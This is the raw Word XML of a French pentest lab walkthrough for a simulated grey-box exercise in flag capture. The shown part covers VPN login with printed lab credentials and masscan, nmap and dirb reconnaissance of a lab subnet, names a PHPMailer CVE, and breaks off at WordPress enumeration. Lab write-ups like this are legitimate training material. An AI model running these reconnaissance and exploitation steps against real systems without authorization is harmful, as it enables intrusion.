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962F" w14:textId="7242319C" w:rsidR="00EA014F" w:rsidRPr="009F42E6" w:rsidRDefault="00CC1DD8" w:rsidP="009F42E6">
      <w:pPr>
        <w:pStyle w:val="Titre1"/>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_Toc210403953"/>
      <w:r>
        <w:t>Guide</w:t>
      </w:r>
      <w:r w:rsidR="0011545A">
        <w:t xml:space="preserve"> d’exploitation</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> complet</w:t>
      </w:r>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:p w14:paraId="1C5E26A4" w14:textId="02AA567B" w:rsidR="0011545A" w:rsidRDefault="0011545A" w:rsidP="009F42E6">
      <w:pPr>
        <w:pStyle w:val="Titre2"/>
      </w:pPr>
      <w:bookmarkStart w:id="1" w:name="_Toc210403954"/>
      <w:r>
        <w:t>Contexte</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1"/>
    </w:p>
    <w:p w14:paraId="227A0092" w14:textId="07EB4A82" w:rsidR="0011545A" w:rsidRDefault="005E34CE" w:rsidP="005E34CE">
      <w:r>
        <w:t>S</w:t>
      </w:r>
      <w:r w:rsidR="0011545A">
        <w:t xml:space="preserve">imulation d’un </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0011545A">
        <w:t>Pentest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0011545A">
        <w:t xml:space="preserve"> en Grey Box </w:t>
      </w:r>
      <w:r>
        <w:t>avec</w:t>
      </w:r>
      <w:r w:rsidR="0011545A">
        <w:t xml:space="preserve"> certificat </w:t>
      </w:r>
      <w:r>
        <w:t>VPN accès à la DMZ fournis, ainsi</w:t>
      </w:r>
      <w:r w:rsidR="0011545A">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>qu’</w:t>
      </w:r>
      <w:r w:rsidR="0011545A">
        <w:t xml:space="preserve">un schéma </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">simplifié </w:t>
      </w:r>
      <w:r w:rsidR="0011545A">
        <w:t>de l’infrastructure </w:t>
      </w:r>
      <w:r>
        <w:t>(sans les adresses précises des machines</w:t>
      </w:r>
      <w:r w:rsidR="0011545A">
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55AF8333" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="005E34CE"/>
    <w:p w14:paraId="7CEE7595" w14:textId="661FF186" w:rsidR="0011545A" w:rsidRDefault="0011545A" w:rsidP="0011545A">
      <w:r>
        <w:t>Objectif principal : vol</w:t>
      </w:r>
      <w:r w:rsidR="005E34CE">
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> le flag principal stocké dans le </w:t>
      </w:r>
      <w:r w:rsidR="005E34CE">
        <w:t>NAS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20A9ED33" w14:textId="56550736" w:rsidR="006802A1" w:rsidRDefault="0011545A" w:rsidP="006802A1">
      <w:r>
        <w:t xml:space="preserve">Objectifs secondaires : </w:t>
      </w:r>
      <w:r w:rsidR="005E34CE">
        <w:t>9 autres</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> flags répartis dans l’ensemble de l’infra</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6665DCAF" w14:textId="77777777" w:rsidR="006802A1" w:rsidRDefault="006802A1" w:rsidP="006802A1"/>
    <w:p w14:paraId="16BF468D" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="006802A1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2685185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D0118B" w14:textId="11F891DF" w:rsidR="006802A1" w:rsidRPr="004A04A1" w:rsidRDefault="006802A1">
          <w:pPr>
            <w:pStyle w:val="En-ttedetabledesmatires"/>
            <w:rPr>
              <w:rStyle w:val="Titre2Car"/>
            </w:rPr>
          </w:pPr>
          <w:r w:rsidRPr="004A04A1">
            <w:rPr>
              <w:rStyle w:val="Titre2Car"/>
            </w:rPr>
            <w:t>Table des matières</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="1FB2609B" w14:textId="750C54AF" w:rsidR="004A04A1" w:rsidRDefault="006802A1" w:rsidP="004A04A1">
          <w:pPr>
            <w:pStyle w:val="TM1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="10456"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
              <w:noProof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03955" w:history="1">
            <w:r w:rsidR="004A04A1" w:rsidRPr="00A1230C">
              <w:rPr>
                <w:rStyle w:val="Lienhypertexte"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Etape 0 : Entrée dans la DMZ, depuis le WAN, par le tunnel VPN</w:t>
            </w:r>
            <w:r w:rsidR="004A04A1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004A04A1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004A04A1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc210403955 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004A04A1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004A04A1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="005A6D4D">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
            <w:r w:rsidR="004A04A1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1930E730" w14:textId="29047E77" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="004A04A1">
          <w:pPr>
            <w:pStyle w:val="TM2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="10456"/>
            </w:tabs>
            <w:ind w:left="0"/>
            <w:rPr>
              <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
              <w:noProof/>
              <w:szCs w:val="24"/>
              <w:lang w:eastAsia="fr-FR"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc210403956" w:history="1">
            <w:r w:rsidRPr="00A1230C">
              <w:rPr>
                <w:rStyle w:val="Lienhypertexte"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Etape 1 : Compromission initiale du serveur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D4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1DDDB" w14:textId="099F7205" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="004A04A1">
          <w:pPr>
            <w:pStyle w:val="TM2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="10456"/>
            </w:tabs>
            <w:ind w:left="0"/>
            <w:rPr>
              <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
              <w:noProof/>
              <w:szCs w:val="24"/>
              <w:lang w:eastAsia="fr-FR"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc210403957" w:history="1">
            <w:r w:rsidRPr="00A1230C">
              <w:rPr>
                <w:rStyle w:val="Lienhypertexte"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Etape 2 : Intrusion initiale dans le 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D4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8BDA1" w14:textId="3F3C90E1" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="004A04A1">
          <w:pPr>
            <w:pStyle w:val="TM2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="10456"/>
            </w:tabs>
            <w:ind w:left="0"/>
            <w:rPr>
              <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
              <w:noProof/>
              <w:szCs w:val="24"/>
              <w:lang w:eastAsia="fr-FR"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc210403958" w:history="1">
            <w:r w:rsidRPr="00A1230C">
              <w:rPr>
                <w:rStyle w:val="Lienhypertexte"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Etape 3 : Compromission de l’AD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D4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F7D43" w14:textId="2FD5AEEF" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="004A04A1">
          <w:pPr>
            <w:pStyle w:val="TM2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="10456"/>
            </w:tabs>
            <w:ind w:left="0"/>
            <w:rPr>
              <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
              <w:noProof/>
              <w:szCs w:val="24"/>
              <w:lang w:eastAsia="fr-FR"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc210403959" w:history="1">
            <w:r w:rsidRPr="00A1230C">
              <w:rPr>
                <w:rStyle w:val="Lienhypertexte"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Etape 4 : Pillage de l’AD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D4D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560E3" w14:textId="538E767F" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="004A04A1">
          <w:pPr>
            <w:pStyle w:val="TM2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="10456"/>
            </w:tabs>
            <w:ind w:left="0"/>
            <w:rPr>
              <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
              <w:noProof/>
              <w:szCs w:val="24"/>
              <w:lang w:eastAsia="fr-FR"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc210403960" w:history="1">
            <w:r w:rsidRPr="00A1230C">
              <w:rPr>
                <w:rStyle w:val="Lienhypertexte"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Etape 5 : Objectif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_Toc210403960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6D4D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D39FF" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="006802A1" w:rsidP="006802A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438046C" w14:textId="02008CFB" w:rsidR="006802A1" w:rsidRPr="004A04A1" w:rsidRDefault="006802A1" w:rsidP="006802A1">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EFE5CFF" w14:textId="4D878CF9" w:rsidR="00EA014F" w:rsidRPr="009F42E6" w:rsidRDefault="0011545A" w:rsidP="009F42E6">
      <w:pPr>
        <w:pStyle w:val="Titre2"/>
      </w:pPr>
      <w:bookmarkStart w:id="2" w:name="_Toc210403955"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Etape 0 : </w:t>
      </w:r>
      <w:r w:rsidR="00CC1DD8">
        <w:t>Entrée dans</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> la DMZ</w:t>
      </w:r>
      <w:r w:rsidR="00CC1DD8">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> depuis le WAN</w:t>
      </w:r>
      <w:r w:rsidR="00CC1DD8">
        <w:t>, par le tunnel VPN</w:t>
      </w:r>
      <w:bookmarkEnd w:id="2"/>
    </w:p>
    <w:p w14:paraId="77D22273" w14:textId="52B22837" w:rsidR="00CC1DD8" w:rsidRDefault="00CC1DD8" w:rsidP="009F42E6">
      <w:r>
        <w:t>Ouvrir un terminal sur le « Bureau de la Kali »</w:t>
      </w:r>
      <w:r w:rsidR="004C2A12">
        <w:t> :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FE3E129" w14:textId="2929D771" w:rsidR="00CC1DD8" w:rsidRDefault="00CC1DD8" w:rsidP="009F42E6">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="453ADA00" wp14:editId="7DCA0491">
            <wp:extent cx="3743325" cy="4867275"/>
            <wp:effectExtent l="0" t="0" r="9525" b="9525"/>
            <wp:docPr id="17561368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36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F7F6" w14:textId="77777777" w:rsidR="00CA5A79" w:rsidRDefault="00CA5A79" w:rsidP="009F42E6"/>
    <w:p w14:paraId="28F2F90B" w14:textId="3B7EDD0B" w:rsidR="00CC1DD8" w:rsidRDefault="00CC1DD8" w:rsidP="009F42E6">
      <w:r>
        <w:t>Ouvrir le certificat VPN</w:t>
      </w:r>
      <w:r w:rsidR="004C2A12">
        <w:t xml:space="preserve"> qui s’y trouve</w:t>
      </w:r>
      <w:r>
        <w:t> :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="449C4AED" w14:textId="41F660E7" w:rsidR="00CC1DD8" w:rsidRPr="00CC1DD8" w:rsidRDefault="00CC1DD8" w:rsidP="00CC1DD8">
      <w:pPr>
        <w:ind w:firstLine="708"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">$ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CC1DD8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CC1DD8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CC1DD8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>openvpn</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CC1DD8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CC1DD8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>VPN_Server_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00CC1DD8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>vpnkali.ovpn</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="2FCB33CC" w14:textId="3EEA7C27" w:rsidR="00CC1DD8" w:rsidRDefault="00CC1DD8" w:rsidP="009F42E6">
      <w:r w:rsidRPr="00CC1DD8">
        <w:t>Entrer l</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>’«</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Auth </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Username</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t> » : « </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>vpnkali</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t> » et l</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>’«</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Auth </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Password</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t> » : « kali2025 » :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D813677" w14:textId="47F682A9" w:rsidR="00CC1DD8" w:rsidRDefault="00CC1DD8" w:rsidP="009F42E6">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="56FF607D" wp14:editId="10BA318D">
            <wp:extent cx="6645910" cy="1567815"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:docPr id="10369084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08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008D" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="009F42E6"/>
    <w:p w14:paraId="4B5FCF09" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="009F42E6"/>
    <w:p w14:paraId="674AE129" w14:textId="0D2CABA1" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="009F42E6">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Si cela fonctionne on obtient :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="788C7190" w14:textId="5D96B2D5" w:rsidR="009D6503" w:rsidRDefault="005D5DCB" w:rsidP="009F42E6">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="79578D69" wp14:editId="47D70FC3">
            <wp:extent cx="6645910" cy="2047875"/>
            <wp:effectExtent l="0" t="0" r="2540" b="9525"/>
            <wp:docPr id="16272061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06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4B3D" w14:textId="10F67962" w:rsidR="009F42E6" w:rsidRDefault="0011545A" w:rsidP="009F42E6">
      <w:pPr>
        <w:pStyle w:val="Titre2"/>
      </w:pPr>
      <w:bookmarkStart w:id="3" w:name="_Toc210403956"/>
      <w:r>
        <w:t xml:space="preserve">Etape 1 : </w:t>
      </w:r>
      <w:r w:rsidR="00CC1DD8">
        <w:t>Compromission initiale du</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> serveur Web</w:t>
      </w:r>
      <w:bookmarkEnd w:id="3"/>
    </w:p>
    <w:p w14:paraId="7FD16557" w14:textId="5A0107AF" w:rsidR="0011545A" w:rsidRDefault="0011545A" w:rsidP="008D3AF0">
      <w:r>
        <w:t xml:space="preserve">Injection d’argument dans un </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>PHPmailer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A24A94">
        <w:t xml:space="preserve">5.2.16 </w:t>
      </w:r>
      <w:r>
        <w:t>vulnérable</w:t>
      </w:r>
      <w:r w:rsidR="00A24A94">
        <w:t xml:space="preserve"> (CVE-2016-10033)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> sur une Debian 3.16.57-2 (2018-07-14</w:t>
      </w:r>
      <w:r w:rsidR="00A24A94">
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A24A94">
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:t>x86_64</w:t>
      </w:r>
      <w:r w:rsidR="00A24A94">
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Raven I ou II de </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>VulnHub</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> modifiée) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="640F97FD" w14:textId="3F41DE5A" w:rsidR="00145896" w:rsidRPr="004C2A12" w:rsidRDefault="004C2A12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  <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004C2A12">
        <w:rPr>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Procédure :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="591945B4" w14:textId="18FFD782" w:rsidR="009D6503" w:rsidRDefault="009D6503" w:rsidP="004C2A12">
      <w:r>
        <w:t>Enumération d’hôtes</w:t>
      </w:r>
      <w:r w:rsidR="00E3699C">
        <w:t xml:space="preserve"> de la DMZ (connue d’après le schéma fournis) :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="512E8444" w14:textId="272D9CBD" w:rsidR="00C1719F" w:rsidRDefault="00C1719F" w:rsidP="009D6503">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00E3699C">
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>asscan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 192.168.20.0/24 -p80</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="155FE55A" w14:textId="14A10716" w:rsidR="00C1719F" w:rsidRDefault="007D233D" w:rsidP="009D6503">
      <w:r w:rsidRPr="007D233D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="00998CF2" wp14:editId="239B5A20">
            <wp:extent cx="6645910" cy="1518920"/>
            <wp:effectExtent l="0" t="0" r="2540" b="5080"/>
            <wp:docPr id="162867190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190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4824" w14:textId="5CFC0034" w:rsidR="00145896" w:rsidRDefault="00145896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5ABDEC61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37733FE5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18D4BA23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6E025047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3A0A0D51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560E64B7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413EE1F3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54003CB6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534F96DD" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1">
      <w:pPr>
        <w:spacing w:before="0" w:after="160" w:line="259" w:lineRule="auto"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
          <w:color w:val="2F5496" w:themeColor="accent1" w:themeShade="BF"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3993EC06" w14:textId="01C98334" w:rsidR="009D6503" w:rsidRDefault="009D6503" w:rsidP="004C2A12">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Enumération de ports</w:t>
      </w:r>
      <w:r w:rsidR="004C2A12">
        <w:t xml:space="preserve"> et services :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="247022D5" w14:textId="4AD30511" w:rsidR="00C1719F" w:rsidRDefault="009D6503" w:rsidP="009D6503">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="001476AF">
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="001476AF">
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001476AF">
        <w:t>Pn</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001476AF">
        <w:t xml:space="preserve"> -f -n -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001476AF">
        <w:t>sV</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001476AF">
        <w:t xml:space="preserve"> -g 0 -p 21,22,80,88,443,445,3306,3389 </w:t>
      </w:r>
      <w:r w:rsidR="00DE36F6">
        <w:t>192.168.20.</w:t>
      </w:r>
      <w:r w:rsidR="007D233D">
        <w:t>10</w:t>
      </w:r>
      <w:r w:rsidRPr="001476AF">
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001476AF">
        <w:t>vvv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="083741F2" w14:textId="13D03E16" w:rsidR="00A00C32" w:rsidRDefault="00497E36" w:rsidP="004C2A12">
      <w:r w:rsidRPr="00497E36">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4C3ED012" wp14:editId="5D37143C">
            <wp:extent cx="6645910" cy="6381115"/>
            <wp:effectExtent l="0" t="0" r="2540" b="635"/>
            <wp:docPr id="69013344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3344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1D2A0" w14:textId="77777777" w:rsidR="004C2A12" w:rsidRDefault="004C2A12" w:rsidP="004C2A12"/>
    <w:p w14:paraId="62F1F9BE" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="004C2A12"/>
    <w:p w14:paraId="3B334CA9" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="004C2A12"/>
    <w:p w14:paraId="26BDD587" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="004C2A12"/>
    <w:p w14:paraId="7BBD1BE6" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="004C2A12"/>
    <w:p w14:paraId="2D689285" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="004C2A12"/>
    <w:p w14:paraId="35A9C5F6" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="004C2A12"/>
    <w:p w14:paraId="727DA355" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="004C2A12"/>
    <w:p w14:paraId="761252D3" w14:textId="65C27517" w:rsidR="009D6503" w:rsidRDefault="009D6503" w:rsidP="004C2A12">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Enumération de répertoires (non récursif : </w:t>
      </w:r>
      <w:r w:rsidR="004C2A12">
        <w:t>« </w:t>
      </w:r>
      <w:r>
        <w:t>-r</w:t>
      </w:r>
      <w:r w:rsidR="004C2A12">
        <w:t> »</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="004C2A12">
        <w:t> :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38005DEA" w14:textId="02E4E67B" w:rsidR="009D6503" w:rsidRDefault="009D6503" w:rsidP="009D6503">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00591017">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>dirb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00591017">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> http://</w:t>
      </w:r>
      <w:r w:rsidR="004C2A12">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>192.168.20.10</w:t>
      </w:r>
      <w:r w:rsidRPr="00591017">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/ -r</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74F184AE" w14:textId="025909AA" w:rsidR="002305CD" w:rsidRPr="00591017" w:rsidRDefault="00A00C32" w:rsidP="009D6503">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A00C32">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2CD4790E" wp14:editId="7AC44509">
            <wp:extent cx="5201376" cy="5725324"/>
            <wp:effectExtent l="0" t="0" r="0" b="8890"/>
            <wp:docPr id="21971995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1995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20A4" w14:textId="5AD30EE6" w:rsidR="00A00C32" w:rsidRDefault="00A00C32">
      <w:pPr>
        <w:spacing w:before="0" w:after="160" w:line="259" w:lineRule="auto"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2366C3FA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4BEB2C07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5465168D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6C60D4F2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16BF3C04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5BDC28F6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450BECB9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0EF93374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6C1C657F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57E39F7D" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1">
      <w:pPr>
        <w:spacing w:before="0" w:after="160" w:line="259" w:lineRule="auto"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="011FBE31" w14:textId="7A519A3F" w:rsidR="009D6503" w:rsidRPr="001B0676" w:rsidRDefault="009D6503" w:rsidP="004C2A12">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B0676">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Enumération</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B0676">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="001B0676">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Wordpress</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="004C2A12">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
